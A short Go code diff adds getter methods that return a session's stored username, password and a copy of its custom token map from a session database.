@@ -54,6 +54,35 @@ func (d *Database) SetSessionCustom(sid string, name string, value string) error
 	return err
 }
 
+func (d *Database) GetSessionUsername(sid string) (string, error) {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return "", err
+	}
+	return s.Username, nil
+}
+
+func (d *Database) GetSessionPassword(sid string) (string, error) {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return "", err
+	}
+	return s.Password, nil
+}
+
+func (d *Database) GetSessionCustomTokens(sid string) (map[string]string, error) {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return nil, err
+	}
+	// Copy map to avoid race conditions if that's a concern (not strictly here but good practice)
+	tokens := make(map[string]string)
+	for k, v := range s.Custom {
+		tokens[k] = v
+	}
+	return tokens, nil
+}
+
 func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
 	err := d.sessionsUpdateBodyTokens(sid, tokens)
 	return err
